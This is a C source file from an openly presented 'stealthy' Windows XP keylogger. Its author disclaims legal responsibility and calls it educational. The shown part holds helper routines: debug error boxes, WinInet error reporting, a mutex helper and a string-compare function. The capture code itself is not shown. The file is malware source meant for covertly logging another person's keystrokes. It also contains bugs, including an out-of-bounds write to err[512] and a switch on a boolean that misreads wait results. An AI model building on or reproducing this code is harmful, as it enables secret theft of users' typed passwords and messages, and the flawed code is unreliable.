
// LogThatShit 
//		A stealthly keylogger designed on and for Windows XP 
//		By Isam M. <r0cket(NO_SPAM)jump@yahoo.com> 
//    http://biodegradablegeek.com

// This software file (the "File") is distributed under the terms of the 
// GNU General Public License Version 3, (the "License"). You may use, 
// redistribute and/or modify this File in accordance with the terms and 
// conditions of the License, a copy of which is available along with the 
// File in the license.txt file or by writing to 
//  Free Software Foundation, Inc., 
//  59 Temple Place, 
//  Suite 330, Boston, MA, 02111-1307 
//  
//  or on the Internet at http://www.gnu.org/licenses/gpl.txt.

// THE FILE IS DISTRIBUTED AS-IS, WITHOUT WARRANTY OF ANY KIND. THE AUTHOR 
// DOES NOT TAKE ANY RESPONSIBILITY FOR ANY DAMAGE OR LEGAL ISSUES YOU MAY 
// FACE WHEN USING THIS APPLICATION. PLEASE NOTE THAT LTS WAS WRITTEN AND 
// RELEASED FOR *EDUCATIONAL* PURPOSES ONLY AND IS NOT INTENDED TO BE USED 
// FOR ANYTHING THAT MAY BE AGAINST THE LAW WHERE YOU LIVE. IF YOU DO NOT 
// WANT THAT RESPONSIBILITY, PLEASE DONT COMPILE OR USE THIS APPLICATION.





#include <stdio.h> 
#include <stdlib.h> 
#include <string.h> 
#include <ctype.h> 
#include <windows.h> 
#include <wininet.h> 
#include "Common.h" 


#ifdef DEBUG_MODE 
void E(const char* const line) { 
	/* Display the text error message of GetLastError() */ 
	char buf[128]; 
	char err[512]; 
	memset(buf, '\0', 128); 
	FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM, \
					0, GetLastError(), \
					MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), \
					buf, 128, 0); 
	snprintf(err, 512, "%s\n\n%s", line, buf); 
	err[512] = '\0'; 
	MessageBox(0, err, "OMG! An error has occured :(", MB_ICONERROR); 
} 

void WIE(const char* const line) { 
	/* Display a WinInet error. */ 
	char buf[128]; 
	char err[128]; 
	DWORD tmp; 
	DWORD sz; 
	DWORD val; 

	val = GetLastError(); 
	sz = 128; 
	InternetGetLastResponseInfo(&tmp, buf, &sz); 

	snprintf(err, 128, "%s\nGetLastError() returned %lu\n%lu: [%s]\n", line, val, tmp, buf); 
	MessageBox(0, err, "WinInet error occured!", MB_ICONERROR); 
} 
#endif 


HANDLE WaitForMutex(const char* const name, DWORD ms) { 
	/*	Attempt to open the mutex and get ownership. */ 
	HANDLE m; 
	m=OpenMutex(MUTEX_ALL_ACCESS, 0, name); 
	if (!m) { 
		/* If the mutex does NOT exist. Create it and get initial ownership. */ 
		if (GetLastError()==ERROR_FILE_NOT_FOUND) { 
			INFO("MUTEX DID NOT INITIALLY EXIST"); 
			INFO(name); 
			m = CreateMutex(0, 1, name); 
			if (m) return m; 
		} 

		WIN_ERR("Unable to open/create mutex!"); 
		WIN_ERR(name); 
		return 0; 
	} 

/*	if (WAIT_OBJECT_0==WaitForSingleObject(m, ms)) return m; */ 
	switch (WAIT_OBJECT_0==WaitForSingleObject(m, ms)) { 
	case WAIT_OBJECT_0: 
		INFO("WAIT0"); 
		return m; 
		break; 
	case WAIT_ABANDONED: 
		INFO("AB"); 
	case WAIT_TIMEOUT: 
		INFO("TO"); 
	case WAIT_FAILED: 
		INFO("FAIL"); 
	} 
	WIN_ERR("WaitForMutex returning 0"); 
	INFO(name); 
	return 0; 
} 


int strcmpi2(const char* const b1, const char* const b2, unsigned int n) { 
	/*	FIXME I don't like how I implemented this. Research on a better algo. 
		Do a case insensitive comparison of N bytes from b1 and b2 
		Both strings MUST be NUL terminated. The NUL terminator is what 
		will stop a crash if b2 is less than n. */ 
	unsigned int i; 
	char a, b; 

	for (i=0; i<n; ++i) { 
		a = tolower(b1[i]); 
		b = tolower(b2[i]); 
		if (!a) { 
			int m, n; 
			m = strlen(b1); 
			n = strlen(b2); 
			if (m==n) return 0; 
			if (m<n) return -1; 
			if (m>n) return 1; 
		} 
		if (a != b) return ((a - b)>0) ? 1 : -1; 
	} 
	return 0; 
} 


